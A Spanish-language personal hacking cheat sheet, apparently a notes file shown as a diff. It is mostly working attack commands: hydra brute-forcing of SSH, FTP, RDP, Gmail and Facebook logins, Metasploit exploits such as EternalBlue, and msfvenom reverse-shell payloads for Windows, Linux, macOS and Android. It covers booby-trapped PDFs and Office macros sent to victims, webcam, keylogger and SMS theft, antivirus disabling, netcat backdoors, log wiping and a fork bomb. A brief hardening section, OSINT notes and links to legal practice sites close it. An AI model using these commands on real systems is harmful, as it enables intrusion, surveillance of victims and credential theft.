+run   
+hydra -V -l <NombreDelUsuario> -p /home/Desktop/pass.txt -t 16 <IpVicOPaginaWeb> ssh  //al final mostrara cuales es su usuario y contraseña
+ssh <IpVicOPaginaWeb> -l root
+ssh <usuarioVictima>@<ipvictima>
+
+
+HYDRA
+hydra <ipvictima> ssh -s <puertossh> -L <listaUsuarios> -P <listaContraseñas> -f -vV
+ssh <usuarioVictima>@<ipvictima>
+https://hacking-etico.com/2014/02/05/ataque-de-fuerza-bruta-ssh-con-hydra/
+
+///////FUERZA BRUTA FTP
+hydra -s 21 -V -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/contraseñas.txt -e s -t 10 -w 5 <ipvictima> ftp  //este es cuando no se sabe el nombre del usuario
+
+hydra -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/contraseñas.txt <ipvictima> ftp  //este es cuando no se sabe el nombre del usuario
+hydra -l <usuario> -P /home/kali/Desktop/contraseñas.txt <ipvictima> ftp  //este es para cuando ya se sabe el usuario
+ftp <ipvictima>  //para acceder al ftp de forma remota con las claves desifradas
+
+msfconsole
+use auxiliary/scanner/tftp/tftpbrute
+set RHOSTS 192.168.1.116
+set THREADS 10
+run
+
+instalar el ftp en ubuntu https://blog.baehost.com/tutorialcomo-instalar-un-servidor-ftp-en-ubuntu-server/
+sebastian - sebastian
+
+///////FUERZA BRUTA TELNET
+hydra -s 23 -V -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/contraseñas.txt -e ns -t 60 -w 15 -f -m <ipvictima> telnet  //este es cuando no se sabe el nombre del usuario
+telnet localhost 
+telnet <ipVictima> <PortTelnet>
+
+msfconsole
+use auxiliary/scanner/telnet/telnet_login
+set BLANK_PASSWORDS false
+set PASS_FILE passwords.txt
+set RHOSTS 192.168.1.0/24
+set THREADS 254
+set USER_FILE users.txt
+set VERBOSE false
+run
+
+///////FUERZA BRUTA RDP
+hydra -t 4 -V -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/contraseñas.txt rdp://<ipvictima>   //este es cuando no se sabe el nombre del usuario
+rdesktop <ipVictima>
+
+///////FUERZA BRUTA SMB LOGIN SAMBA
+msfconsole
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.1.150-165
+set PASS_FILE /root/passwords.txt
+set USER_FILE /root/users.txt
+set THREADS 16
+set VERBOSE false
+run
+
+///////FUERZA BRUTA HTTP-GET -port 80
+hydra <ipVictima> http-get -v -V -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/contraseñas.txt -e ns -t 5 -w 30 -m / -f   //este es cuando no se sabe el nombre del usuario
+
+///////FUERZA BRUTA HTTP-POST-FROM
+https://www.youtube.com/watch?v=3hjHdkZsCCo
+ 
+///////FUERZA BRUTA EN WORDPRESS
+msfconsole
+use auxiliary/scanner/http/wordpress_login_enum
+set URI /wordpress/wp-login.php
+set PASS_FILE /tmp/passes.txt
+set USER_FILE /tmp/users.txt
+set RHOSTS 192.168.1.201
+run
+
+///////FUERZA BRUTA EN MYSQL
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set PASS_FILE /tmp/passes.txt
+set RHOSTS 192.168.1.200set USER_FILE /tmp/users.txtrun
+
+///////FUERZA BRUTA GMAIL
+hydra -s 465 -S -v -V -l <correoVictima> -P '/home/Desktop/user.txt' -t 1 -w 32 smtp.gmail.com smtp
+https://www.youtube.com/watch?v=9WmJNceMP1g
+
+hydra -S -l <correoVictima> -P /home/Desktop/user.txt -e ns -V -s 465 smtp.gmail.com smtp 
+
+///////FUERZA BRUTA FACEBOOK
+hydra -s 443 -l <correoVictima> -P /home/Desktop/contraseña.txt -f www.facebook.com https-get
+
+///////FUERZA BRUTA A IMAP
+msfconsole
+use auxiliary/dos/windows/imap/fuzz_imap
+set RHOST <ipVictima>
+set IMAPUSER test
+set IMAPPASS testrun
+------------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// INTRUSION CON EXPLOIT Y LINUX  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+sudo su    //para quedar como super usuario de kalilinux
+setxkbmap es sundeadkeys   //poner el teclado en español
+sudo apt-get update
+
+///////SCANEO 
+nmap 192.168.0.0/24 > scaneo.txt //escaneaa todos los usuarios
+nmap -sV  > scaneoversion.txt //version de los puertos abiertos
+nmap 192.168.0.1/24 -p 22  //escanea todos los dispositivos conectados y muestra los que tiene el puerto 22 abierto
+
+netdiscover -i eth0 -r 192.168.0.0/24  //escanea todos los usuarios de la red
+
+use auxiliary/scanner/http/http_version
+set rhost paginaweb.com
+set rport 443
+run
+
+use auxiliary/scanner/smb/smb_ms17_010
+set rhost <ip victima>
+run
+
+use auxiliary/scanner/portscan/syn
+set INTERFACE eth0set PORTS 80set RHOSTS 192.168.1.0/24
+set THREADS 50
+run
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.200-211
+set THREADS 11
+set PORTS 22,80,137,445
+run
+
+use auxiliary/scanner/x11/open_x11
+set RHOSTS 192.168.1.1/24
+set THREADS 50
+run
+use auxiliary/scanner/ftp/ftp_version
+set RHOSTS 192.168.1.200-254
+set THREADS 55run
+
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.150-165
+set THREADS 16
+run
+use auxiliary/scanner/smtp/smtp_version
+set RHOSTS 192.168.1.0/24
+set THREADS 254
+run
+
+use auxiliary/scanner/smtp/smtp_enum   //muestra los posibles usuarios del smtp
+set RHOSTS 192.168.1.56
+run
+use auxiliary/scanner/snmp/snmp_enum  //muestra la version y otros datos del snmp
+set RHOSTS 192.168.1.2
+run
+
+use auxiliary/scanner/snmp/snmp_enumusers  //muestra los posibles usuarios del snmp
+set RHOSTS 192.168.1.200-211set THREADS 11run
+
+use auxiliary/scanner/netbios/nbname_probe   //muestra el nombre de la BIOS de la victima
+set RHOSTS 192.168.1.200-210
+set THREADS 11
+run
+use auxiliary/scanner/pop3/pop3_version  //muestra la version del pop3
+set RHOSTS 192.168.1.200-250set THREADS 20
+run
+
+
+use auxiliary/scanner/http/enum_delicious  //muestra los dominios de la victima
+set DOMAIN metasploit.com
+run
+
+
+use auxiliary/scanner/http/options  //muestra que tipo de codigo hay en un servidor
+set RHOSTS 192.168.1.200-210
+set THREADS 11
+run
+use auxiliary/scanner/http/ssl   //busca si hay certificado SSL en las victimas
+set RHOSTS 192.168.1.200-254set THREADS 20
+run
+
+
+use auxiliary/scanner/http/http_version    //buca que version es el servidor web
+set RHOSTS 192.168.1.0/24
+set THREADS 255
+run
+
+use auxiliary/scanner/http/webdav_scanner    //Nos muestra si el servidor tiene activo el webdav
+set RHOSTS 192.168.1.200-250
+set THREADS 20
+run
+
+db_connect root:toor@localhost/wmap  //se inicia la base de datos de wmap
+load wmap
+wmap_targets -a http://192.168.1.204  //Wmap se usa para escanear servidores web y ver que SO tiene ese servidor
+wmap_targets -p  //con el -p miramos que puerto tiene abierto ese servidor
+wmap_run -e  //con el -e miramos que SO es el que esta en esa maquina 
+db_hosts -c address,svcs,vulns  //miramos en la bd que servidores escaneamos y que vulnerabilidades tenemos
+db_hosts -a 192.168.1.204 -c address,mac,svcsdb_vulns   //vemos la descripcion de la vulnerabilidad y copiamos lo que esta luego de REFS y lo desencriptamos
+echo "BAhbByIIQ1ZFIg4yMDA1LTMzOTg=" | openssl base64 -d
+db_exploited
+
+load nessus
+nessus_connect dook:s3cr3t@192.168.1.100 ok
+nessus_policy_list
+nessus_scan_new 1 pwnage 192.168.1.161nessus_scan_status
+nessus_report_list  //aqui los arroja un resultado 
+nessus_report_get 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1fdb_hosts -c address,vulns 
+db_vulns
+db_exploited
+
+///////BUSQUEDAS DENTRO DE MSFCONSOL
+
+irb   //buscar exploits por puerto en msfconsol
+framework.exploits.each_module { |n,e| x=e.new; print_good("#{e.fullname}: #{x.datastore['RPORT']}") if x.datastore['RPORT'].to_i == 445 }; nil
+
+search <nombre de la version puerto abierto>   //en msf se puede buscar vulnerabilidad con el nombre del puerto
+
+shred -zxuvf <nombre de archivo>  // elimina rastro puede ser cd /var/log/auth.log  o kern.log
+
+
+//////EXPLOTACION DE WINDOWS
+
+
+use exploit/windows/smb/ms17_010_eternalblue ---> //windows 7 y 8 de 64 bits con el service "microsoft-ds"
+set rhost <ip de la victima>
+set rport <port donde esta micresoft-ds>
+run
+
+
+use exploit/windows/smb/ms17_010_eternalblue_win8  // Windows server 2012, win 8, win10
+set rhost <ip de la maquina victima>
+set payload windows/x64/meterpreter/reverse_tcp
+set rhost <ip de la maquina victima>
+set lhost <ip de la maquina>
+set rport <port abierto>
+set smbpass <contraseña>
+set smbuser <usuario>
+options
+show payloads
+
+
+use exploit/windows/smb/eternalblue_doublepulsar
+set rhost <ip de la maquina victima>
+set processinject explorer.exe
+set payload windows/meterpreter/reverse_tcp
+set rhost <ip de la maquina victima>
+set lhost <ip de la maquina>
+set rport <port abierto>
+
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip del atacante> lport=4444 -f exe > virus.exe
+msfconsole
+use exploit/multi/handler 
+use multi/hadler       //este comando o el de arriba
+set payload windows/meterpreter/reverse_tcp
+set lhost <ip del atacante>
+set lport <port del atacante>
+run
+sendspace.com
+
+use exploit/windows/fileformat/adobe_utilprintf    //Infectar un PDF
+set FILENAME NombreLlamativo.pdf
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <ipatacante>
+set LPORT <portatacante>
+exploit
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <ipatacante>
+set LPORT <portatacante>
+exploit    //enviamos el pdf y esperamos a que la persona lo abra, es indetectable por antivirus
+9999
+
+use exploit/windows/smb/psexec
+set rhost <ip victima>
+set PAYLOAD windows/shell/reverse_tcp
+set lhost <ip del atacante>
+set rport <port abierto>
+set SMBUSER victim
+set SMBPASS s3cr3texploit
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=<ipatacante> LPORT=<portatacante> ENCODING=shikata_ga_nai V    //Infectar office
+//luego el codigo que se muestra se copia en el office; vaya a Ver macros, coloque un nombre como "mu" y seleccione"crear".
+//Esto abrirá el Editor de Visual Basic
+msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=<ip del atacante> LPORT=<port del atacante> E   //se pone en espera a que abran el office
+
+use exploit/multi/browser/java_signed_applet   ---> // windows 8 y luego de dar <java -version> en la consola del windows aparece version 1.7
+set srvport 80
+set uripath /
+set payload windows/meterpreter/reverse_tcp
+show option
+set lhost <ip del atacante>    //la persona debe intentar entrar a la ip del atacante (http://192.168.1.17:8080) y aceptar el archivo que esta ahi
+run
+sessions -l
+sessions -i 1
+
+use exploit/multi/browser/firefox_xpi_bootstrapped_addon    //exploit para firefox
+set payload generic/shell_reverse_tcp
+set lhost <ip del atacante>
+set srvhost <ip del atacante>
+set srvport <puerto del atacante>
+set uripath /
+exploit         //luego de explotar, la victima debe abrir el ip y el puerto en el buscados firefox y descargar el exploit
+sessions -l
+sessions -i 1
+ipconfig
+https://www.hacking.land/2014/03/hackeando-un-pc-sin-vulnerabilidades.html?m=1
+
+use exploit/windows/browser/ani_loadimage_chunksize
+set URIPATH /
+set PAYLOAD windows/shell/reverse_tcp
+set lhost <ip del atacante>
+set lport <port abierto>
+exploit
+
+use exploit/windows/browser/ms10_002_aurora   //exploit para internet explorer
+set URIPATH /
+set PAYLOAD windows/shell/reverse_tcp
+set lhost <ip del atacante>
+set lport <port abierto>
+exploit -j
+
+
+use exploit/windows/fileformat/ms15_100_mcl_exe  //para este exploit hay que enviarle un archivo a la victima
+set srvhost <ip del atacante>
+set payload windows/meterpreter/reverse_tcp
+set lhost <ip del atacante>
+exploit
+
+use windows/fileformat/audacity
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <ip del atacante>
+exploit
+
+
+use exploit/windows/fileformat/a-pdf_wav_to_mp3   //windows xpset OUTPUTPATH /var/www
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <ip del atacante>
+exploit
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.101
+exploit
+
+use exploit/windows/smb/ms08_067_netapi   // Todos los tipos de windows xp
+set RHOST 10.211.55.140set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.211.55.162
+set LANG english
+show targets
+set TARGET 8exploit
+
+msfpayload windows/shell_reverse_tcp LHOST=<ip del atacante> LPORT=<port atacante> X > /tmp/1.exe      
+msfconsole
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set LHOST <ip del atacante>
+set LPORT <port atacante>
+exploit
+
+
+run post/windows/gather/hashdump   //esto va en el meterpreter dentro de la red y arroja un hash, lo copiamos y luego..
+msfconsole
+use exploit/windows/smb/psexec
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ipatacante>
+set LPORT <portatacante>
+set RHOST <ipvictima>
+set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c  //ponemos el hash que arrojo hashdump
+exploit
+
+msfconsole         //exploit para mysql 
+use auxiliary/scanner/http/phpMyAdmin_login
+set rhosts 192.168.1.171
+set USER_AS_PASS true
+set targeturi /phpMyAdmin/index.php
+set user_file /tmp/users.txt
+set pass_file /tmp/passwords.txt
+run
+
+use exploit/windows7dcerpc7ms07_029_msdns_zonename
+
+use dos/windows/smb/ms09_001_write
+
+git clone https://github.com/thelinuxchoice/spyeye
+cd spyeye/
+bash install.sh
+chmod +x spyeye
+puerto: 
+payload name :
+//Luego el programa genera un link que se le envia a la victima y si instala el archivo .exe el programa empieza a tomar screenshot
+
+PHANTOMDOOR   //Puerta trasera para todas los SO
+git clone https://github.com/venom0x16/PhantomDoor
+cd PhantomDoor/
+chmod +x PhantomDoor.py
+./PhantomDoor.py
+https://esgeeks.com/phantomdoor-hacking-windows-linux-macos-android-con-backdoor/?fbclid=IwAR33PQwUvV6_GmVzC4Xw76ECLQ-9MaQTz1111m9chgQHAk28muhk2MvzJlU
+
+
+
+//////// POST EXPLOTACION WINDOWS
+
+?    //luego de estar adentro de el win8 en metepreter escribimos este signo para ver que podemos hacer
+sysinfo  // informacion sobre el computador vulnerado
+idletime //muestra cuanto tiempo ha estado inactivo la victima
+screenshot //dentro del meterpreter con este comando tomamos una foto de la pantalla
+webcam_list   //ver lista de camaras conectadas en el computador
+webcam_snap  // tomar foto de la camara de la victima
+webcam_stream  //muestra lo que esta captando la camara
+run webcam -p /root //va tomando varias fotos y las muestra en mozilla
+run webcam -i 2 -p /root  //para grabar en la camara 2
+shell     //acceder al los archivos del computador
+getsystem  // Intentará elevar los privilegios al máximo
+pwd       //muestra donde esta el usuario del windows
+run checkvm     //verifica si es una maquina virtual
+run get_application_list   //muestra las aplicaciones instaladas en el pc de la victima
+keyscan_start  //activa un tipo de keylogger
+keyscan_dump   //muestra lo optenido por el keylogger
+keyscan_stop   //para el keylogger
+netstat -ano   // ver las comunicaciones dentro de la victima
+run scraper  //guarda los logs de la victima, para ver los logs hay que ir a otra terminal y dar "ls -a" luego "cd .msf4" "cd logs" "cd scripts" "cd scraper" "cd todo los numeros que hay" "cat network.txt"
+run arp_scanner -r 192.168.0.1/24   //muestra otras maquinas del mismo segmento ip
+run gettelnet -e  //activar telnet en la victima
+run killav   //desactiva el antivirus de la victima
+run get_local_subnets  //muestra la mascara de red de la victima
+run winenum  // detallada enumeración de las ventanas. Vuelca tokens, hashes y mucho más.
+run scraper   //toma informacion del sistema y sus registros
+netsh firewall show state  //ver estado del firewall
+netsh advfirewall firewall add rule name="salida troyano" dir=in action= allow protocol=TCP localport=12345  //agregar regla al firewall, permitir el puerto 12345
+net user remoto juancarlos /add   agregar usuario   //crea usuario
+net localgroup administradores remoto /add          //agregar usuario a administradores
+search -f *.jpg  //busca todos los archivos jpgsearch -f *.pdf  //busca todos los archivos pdf
+search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.pdf  //busca exactamente en unas carpetas
+download  c:\\boot.ini  //descarga un archivo 
+upload virus.exe c:\\windows\system32  // sube un archivo a la victima
+execute -f cmd.exe -i  // ejecuta cmd dentro de la victima
+execute -f virus.exe -i -H  //ejecuta un archivo dentro de la victima
+clearev // borra los rastros en el computador de la victima
+run clearlogs  //borra los log de la victima
+reboot  // recetear el win8
+background  // guardar session
+
+download  c:\\boot.
+
+irb
+client.sys.config.sysinfo   //sirve para obtener el nombre de la máquina del host de la victima
+client.sys.config.sysinfo['OS']  //version del sistema operativo
+client.sys.process.getpid  //Sesion que se esta ejecutando
+
+run post/windows/manage/migrate
+run post/windows/capture/keylog_recorder  //instalamos el keyloger
+cat /root/.msf3/loot/nombredelarchivoquegeneroenkeyloger.txt  //para ver la informacion del keyloger
+run post/multi/gather/firefox_creds  //captura las cookies y credenciales de un computador
+run post/windows/gather/enum_applications  //muestra las aplicaciones instaladas en la victima
+run post/windows/gather/usb_history  //muestra la historia del puerto usb
+run post/windows/manage/delete_user USERNAME=hacker  //borra el usuario hacker de la victima
+
+upload /pentest/windows-binaries/tools/nc.exe C:\\windows\\system32   //Abrir puerta trasera en al victima. se sube netcat en el system32 de la victima
+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'   //activamos el nc en el puerto 445
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+execute -f cmd -i
+netsh firewall show opmode
+netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL //activamos el nc en el puerto 445
+netsh firewall show portopening
+nc -v 172.16.104.128 455   //abro otro terminal y ingreso a la puerta trasera 
+
+
+////// EXPLOTACION LINUX
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<ipatacante> lport=<portatacante> -f elf -o /var/www/html/virus.elf
+service apache2 start    //La victima debe entrar a la direccion ip de el atacante ejemplo 192.168.0.16/virus.elf
+msfconsole
+use exploit/multi/handler/
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost <ipatacante>
+set lport <PortatAcanteYaEscogido>
+run
+https://www.youtube.com/watch?v=BZN2zNymMZM   min6
+port 4321
+
+use exploit/unix/ftp/vsftpd_234_backdoor  ---> //servidor Linux vulnerabilidad FTP vsftpd 2.3.4
+set rhosts <ip victima>
+run
+
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set rhost <ipvictima>
+set rport <portdondeestaelirc>
+run
+https://www.youtube.com/watch?v=p5xnMHAeIxE
+INSTALAR UN IRCD QUE DA VULNERABILIDAD https://www.linuxito.com/gnu-linux/nivel-alto/502-instalacion-y-configuracion-basica-de-un-servidor-irc-en-debian
+
+use exploit/multi/script/web_delivery
+show targets
+set target 1
+set payload php/meterpreter/reverse_tcp
+set lhost <ipAtacante>
+run  //el ultimo link que sale "php d allow_url_fopen" se pone en el terminal de la victima y eso crea la sessions
+sessions -1
+https://www.youtube.com/watch?v=qVFoxAGLIdU
+
+use exploit/multi/samba/usermap_script
+set payload cmd/unix/bind_perl
+set rhost <ipvictima>
+run
+
+use exploit/linux/misc/gld_postfix  ---->  //linux redhat
+set rhosts <ip victima>
+pwd
+root
+
+set payload cmd/unix/reverse
+unset payload cmd/unix/interact  //quita el payload cmd..
+
+
+///////POST EXPLOTACION LINUX
+sysinfo
+ifconfig
+help  //ver los comandos que puedo usar 
+ps //procesos activos en linux
+reboot  //recetea el linux 
+
+cd/ var
+ls
+
+
+shell  
+whoami //para ver que usuario tenemos
+show interfaces
+netstat -a > procesos.txt  //guarda los datos que muestra el netstat
+traceroute -a > ruta.txt  // guarda la ruta que toma un mensaje
+whereis  //muestra la ubicacion de un archivo en especial
+startx  //inicia el entorno grafico
+poweroff  //apagar
+reboot   //reinicia
+mkdir <nombre> //crea una carpeta
+rmdir <nombre> //borra carpeta
+nano <nombre>  //edita un archivo
+cat <nombre>  //muestra lo que esta dentro del archivo
+get <nombe> // descarga el archivo a nuestro linux
+:(){ :|: & };:   //es una función bash. Una vez ejecutada, se repite varias veces hasta que el sistema se bloquea.
+
+history  //lista de comandos ejecutados
+w // inicio de sesion ip y hora
+last //detalles de inicio de session 
+ps auxf  //nformación sobre los procesos en ejecución.
+netstat -plunt  //puertos abiertos
+
+use post/linux/gather/enum_services
+set session 1
+run 
+cat /root/.msf3/loot/20110602161959_default_192.168.184.130_linux.services_184278.txt
+
+cat /etc/passwd   //usuarios y contraseñas 
+cat /etc/shadow   //puede haber mas informacion de usuarios y contraseñas
+cat /etc/groups   //informacion relacionada a grupos
+cat /etc/login.defs  //valores por defecto
+cat /etc/shells   //lista de shells validas
+cat /etc/securetty    //tiene informacion sobre puertos
+
+
+
+
+///// EXPLOTACION DE MAC OSX
+msfvenom -p osx/x86/shell_reverse_tcp lhost=<ipatacante> lport=<portatacante> -f macho -o shell_macho.macho
+msfconsole 
+use multi/handler
+set payload osx/x86/shell_reverse_tcp
+set lhost <ipatacante>
+set lport <portatacante>
+run
+
+msfvenom -p python/meterpreter/reverse_tcp lhost=<ipatacante> lport=<portatacante> -o > virus.py
+msfconsole 
+use multi/handler
+set payload python/meterpreter/reverse_tcp
+set lhost <ipatacante>
+set lport <portatacante>
+run
+
+msfpayload osx/x86/isight/bind_tcp X > /tmp/osxt2
+msfconsole
+use multi/handler
+set PAYLOAD osx/x86/isight/bind_tcp	
+ifconfig eth0
+set RHOST <ipvictima>exploit
+
+msfvenom -p osx/x86/shell_reverse_tcp lhost=<ipatacante> lport=<portatacante> -f macho -o shell_macho.dmg
+
+///// EXPLOTACION DE ANDROID
+
+msfvenom -p android/meterpreter/reverse_tcp lhost=<ipatacante> lport=<portatacante> r> /var/www/html/virus.apk
+msfconsole
+use exploit/multi/handler/
+set payload android/meterpreter/reverse_tcp
+set lhost <ipatacante>
+set lport <PortatAcanteYaEscogido>
+run
+sendspace.com
+sendspace.com/file/2321j5 - port 1234
+
+
+msfconsole
+use exploit/android/adb/adb_server_exec
+set rhost <ipvictima>
+show targets
+set target 1 
+set payload linux/x86/meterpreter/reverse_tcp
+set lport 4444
+set lhost <ipatacante>
+run
+
+///// POST EXPLOTACION DE ANDROID
+
+localtime
+webcam_list   //ver lista de camaras conectadas en el computador
+webcam_snap  // tomar foto de la camara de la victima
+webcam_snap -i 2  // tomar foto de la camara de la victima
+webcam_stream  //muestra lo que esta captando la camara
+run webcam -p /root //va tomando varias fotos y las muestra en mozilla
+run webcam -i 2 -p /root  //para grabar en la camara 2
+record_mic -d 20 //Grabar 20s de audio
+dump_sms  //muestra un txt con los mensajes
+dump_calllog   //muestra un txt con las llamadas
+dump_contacts   //muestra un txt con los contactos
+geolocate
+lan_geolocate
+wlan_geolocate
+interval_collect -c geo -t 15 -a start  //empieza a calcular geolocalizacion cuando le damos star
+interval_collect -c geo -t 15 -a stop   //muestra el calculo geolocalizacion cuando le damos stop
+activity_start tell:231123123
+activity_start content://contacts/people/1
+send_sms -d +573001234567 -t "hacked"
+rm <archivo> // Eliminar archivo
+rmdir <carpeta> //Eliminar carpeta
+mkdir <dir> // Crear carpeta
+
+shell
+cd /sdcard
+ls
+cd <CarpetaDeseada>
+download <archivo>
+
+----------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// MEDIDAS DE PROTECCION CONTRA INTRUSOS  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+/////////LINUX
+usermod -L nombreusuario  //Bloquea al usuario de sistema
+usermod -s /bin/bash/nologin nombreusuario  //desbloque al usuario
+
+nano /etc/host.allow   //Bloquear el acceso en ssh de una ip 
+sshd: 192.168.1.100: deny   //se pone esto dentro de host.allow y bloque la ip terminada en 100
+
+nano /etc/host.deny   //Bloquear el acceso en ssh de todos 
+sshd: ALL: spawn /bin/echo "Acceso denegado al servicio" %d "desde el equipo" %h >> /Denegados
+
+
+chattr +a nombrefichero  //Para que el ficheo solo lo abra el usuari root
+chattr –i nombrefichero 
+
+---------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// OSINT - Inteligencia de fuentes abiertas ///////////////////////////
+/////////////////////////////////////////////////
+
+interrogatorio digital : no es un cuestionario, sino adquirir informacion de sus dispositivos moviles
+
+crminologia : educativo
+criminalista: inductiva 
+
+planificacion : que queremos hacer? que queremos buscar?, tecnicas y herramientas.
+obtencion : generacion de identidades, busqueda por informacion personal
+procesamiento : escoger la informacion
+analisis : 
+inteligencia :
+
+
+la informacion se divide entre : personal y organizacion
+
+herramientas osint:
+buscadores habituales, buscadores espesificos
+metagoofi, libextrator, domaintools, robtex, myipneighbors, redes sociales,
+gooscan, sitedigger, osintstalker, cree.py , theharvester, palantir, maltego
+
+DATOS: 
+Nombre, edad, lugar de vivienda, educacion, familia, viajas, vida laboral, gustos personales
+datos personales, que hacer cotidinao, etiquetado de los familiares, constumbres personales, bienes personales, ego
+
+----------------------------------
+
+QUITAR CONTRASEÑA EN WINDOWS
+
+estando en el inicio de sesion dar click en shift sostenido y luego dar click en reiniciar
+
+solucionar problemas
+opciones avanzadas
+simbolo de sistema
+
+cuando ya estemos en cmd vamos al disco duro donde este el windows
+ejeemplo:  d:
+
+cd windows/system32
+
+rename osk.exe osk.old
+rename cmd.exe osk.exe
+
+net user
+net user tuUsuario *
+
+buscamos otra vez el inicio de sesion
+volvemos a estar en el inicio de sesion dar click en shift sostenido y luego dar click en reiniciar
+solucionar problemas
+opciones avanzadas
+simbolo de sistema
+
+cuando ya estemos en cmd vamos al disco duro donde este el windows
+ejeemplo:  d:
+
+cd windows/system32
+rename osk.exe cmd.exe
+rename osk.old osk.exe
+
+https://www.youtube.com/watch?v=lTwn74cD7HU
+https://www.youtube.com/watch?v=bVD4JP1UpRA
+-
+HIRENBOOT
+https://www.youtube.com/watch?v=-zh6pDprqs0
+https://www.google.com/search?q=Hiren%27s+BOOT&sca_esv=576236845&rlz=1C1SQJL_esCO872CO872&tbm=vid&sxsrf=AM9HkKm4Yrk_6F9WX5_IK30WtDxfEh3OnQ:1698182196689&source=lnms&sa=X&ved=2ahUKEwiSvOPUzY-CAxWZnGoFHXMSASMQ_AUoAXoECAUQAw&biw=1517&bih=674&dpr=0.9
+https://www.hirensbootcd.org/usb-booting/
+--------------------------------------
+
+
+Los mejores sitios web para probar tus habilidades de piratería  
+https://pwnable.kr/
+ https://hack.me/
+ 
+https://ctflearn.com/
+ 
+https://google-gruyere.appspot.com/ #TheCyberArmy
+ 
+https://www.root-me.org/en/
+ 
+https://www.hackthebox.eu/
+ 
+https://www.hacking-lab.com/
+ 
+http://www.gameofhacks.com/
+ 
+https://overthewire.org/
+ 
+https://microcorruption.com/
+ 
+https://xss-game.appspot.com/?utm_source...dium=email
+ 
+https://www.hackthissite.org/pages/index/index.php
+ 
+https://crackmes.one/
+ https://pentest.training/
+ 
+https://www.hellboundhackers.org/
+ 
+http://hax.tor.hu/
+ 
+https://thisislegal.com/
+ 
+https://tryhackme.com/
+
+
+
